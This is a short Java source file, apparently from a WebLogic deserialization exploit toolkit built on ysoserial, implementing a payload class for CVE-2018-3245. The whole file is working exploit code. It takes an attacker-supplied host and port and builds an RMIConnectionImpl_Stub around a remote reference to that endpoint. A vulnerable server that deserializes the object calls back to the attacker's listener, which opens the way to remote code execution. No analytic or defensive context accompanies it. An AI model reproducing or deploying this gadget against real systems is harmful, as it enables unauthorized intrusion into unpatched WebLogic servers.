package unserWeblogic.gadgets;

import java.rmi.server.ObjID;
import java.util.Random;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import ysoserial.payloads.util.PayloadRunner;

import javax.management.remote.rmi.RMIConnectionImpl_Stub;

public class CVE_2018_3245 extends PayloadRunner implements ObjectPayload<Object> {

    public Object getObject ( final String command ) throws Exception {

        String host;
        int port;
        int sep = command.indexOf(':');
        if ( sep < 0 ) {
            port = new Random().nextInt(65535);
            host = command;
        }
        else {
            host = command.substring(0, sep);
            port = Integer.valueOf(command.substring(sep + 1));
        }
        ObjID id = new ObjID(new Random().nextInt());
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RMIConnectionImpl_Stub stub = new RMIConnectionImpl_Stub(ref); // 使用RMIConnectionImpl_Stub封装
        return stub;
    }
}
